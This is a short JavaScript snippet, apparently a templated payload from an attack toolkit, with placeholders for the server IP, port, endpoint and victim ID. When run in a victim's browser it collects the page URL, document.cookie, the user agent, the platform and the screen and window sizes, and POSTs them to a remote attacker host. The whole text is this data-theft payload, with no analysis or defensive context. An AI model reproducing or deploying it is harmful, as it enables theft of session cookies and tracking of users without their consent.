// not tested
u = "https://{{IP}}:{{PORT}}{{INFO_ENDPOINT}}/{{UID}}";
//console.log(window.location.href);
//console.log(document.cookie);
j = {url: window.location.href,
    cookie: document.cookie,
    user_agent: window.navigator.userAgent,
    platform: window.navigator.platform,
    screen_resolution: window.screen.width + "x" + window.screen.height,
    browser_size: window.innerWidth + "x" + window.innerHeight
};
fetch(u, {
    method: "POST",
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(j)
});
